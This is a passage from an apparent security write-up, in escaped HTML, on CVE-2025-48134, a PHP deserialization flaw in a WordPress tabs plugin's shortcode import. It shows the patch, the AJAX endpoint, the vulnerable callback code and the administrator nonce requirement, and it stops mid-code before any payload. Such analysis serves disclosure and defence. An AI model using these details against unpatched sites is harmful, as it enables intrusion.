class=&#34;lightgallery&#34; href=&#34;http://localhost:1313/posts/2025-11-24-cve-2025-48134/diff.png&#34; title=&#34;Patch changes&#34; data-thumbnail=&#34;/posts/2025-11-24-cve-2025-48134/diff.png&#34; data-sub-html=&#34;&lt;h2&gt;Diff&lt;/h2&gt;&lt;p&gt;Patch changes&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-24-cve-2025-48134/diff.png&#39; alt=&#34;Diff&#34; height=&#34;320&#34; width=&#34;1914&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Patch changes&lt;/figcaption&gt;&#xD;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;The patch uses &lt;code&gt;unserialize&lt;/code&gt; with &lt;code&gt;&#39;allowed_classes&#39;&amp;ensp;=&amp;gt;&amp;ensp;false&lt;/code&gt;, completely removing the ability to instantiate objects and fully mitigating the vulnerability.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;The plugin registers an AJAX endpoint for logged-in users (&lt;code&gt;wp_ajax_&lt;/code&gt;):&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;loader&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;add_action&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;wp_ajax_tabs_import_shortcode&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$import_export&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;import_shortcode&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Accessing the endpoint &lt;code&gt;/wp-admin/admin-ajax.php&lt;/code&gt; with &lt;code&gt;action=tabs_import_shortcode&lt;/code&gt; calls the &lt;code&gt;import_shortcode&lt;/code&gt; callback:&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;public&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nf&#34;&gt;import_shortcode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$nonce&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;empty&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$_POST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;nonce&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;?&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;sanitize_text_field&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;wp_unslash&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$_POST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;nonce&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;wp_verify_nonce&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$nonce&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;wptabspro_options_nonce&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;wp_send_json_error&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;message&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;esc_html__&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Error:&amp;ensp;Nonce&amp;ensp;verification&amp;ensp;has&amp;ensp;failed.&amp;ensp;Please&amp;ensp;try&amp;ensp;again.&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;wp-expand-tabs-free&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;&amp;ensp;&lt;span class=&#34;mi&#34;&gt;401&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$allow_tags&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$_POST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;unSanitize&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;?&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;sanitize_text_field&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;wp_unslash&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$_POST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;unSanitize&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;c1&#34;&gt;//&amp;ensp;Don&amp;#39;t&amp;ensp;worry&amp;ensp;sanitize&amp;ensp;after&amp;ensp;JSON&amp;ensp;decode&amp;ensp;below.&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$data&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$_POST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;shortcode&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;?&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;wp_unslash&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$_POST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;shortcode&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;//phpcs:ignore&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$data&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;json_decode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$data&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$data&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;json_decode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;true&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$shortcodes&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$allow_tags&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;?&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;shortcode&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;wp_kses_post_deep&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;shortcode&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$data&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;wp_send_json_error&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;message&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;__&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Nothing&amp;ensp;to&amp;ensp;import.&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;wp-expand-tabs-free&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;mi&#34;&gt;400&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line hl&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$status&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;import&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$shortcodes&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;is_wp_error&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;thing&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$status&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;wp_send_json_error&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;message&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$status&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;get_error_message&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(),&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;mi&#34;&gt;400&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;wp_send_json_success&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$status&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;mi&#34;&gt;200&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The function checks the nonce; if invalid, it returns an error and stops execution.&lt;/p&gt;&#xA;&lt;p&gt;Testing the plugin, the &lt;strong&gt;import&lt;/strong&gt; feature is found at &lt;code&gt;/wp-admin/edit.php?post_type=sp_wp_tabs&amp;amp;page=tab_tools#tab=2&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; href=&#34;http://localhost:1313/posts/2025-11-24-cve-2025-48134/search1.png&#34; title=&#34;Import feature&#34; data-thumbnail=&#34;/posts/2025-11-24-cve-2025-48134/search1.png&#34; data-sub-html=&#34;&lt;h2&gt;Import feature&lt;/h2&gt;&lt;p&gt;Import feature&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-24-cve-2025-48134/search1.png&#39; alt=&#34;Import feature&#34; height=&#34;519&#34; width=&#34;1238&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Import feature&lt;/figcaption&gt;&#xD;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;This feature is restricted to Administrators, so a valid nonce must belong to an Administrator.&lt;/p&gt;&#xA;&lt;p&gt;The uploaded JSON file is assigned to the &lt;code&gt;shortcode&lt;/code&gt; parameter in the POST request:&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$data&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$_POST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;shortcode&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span 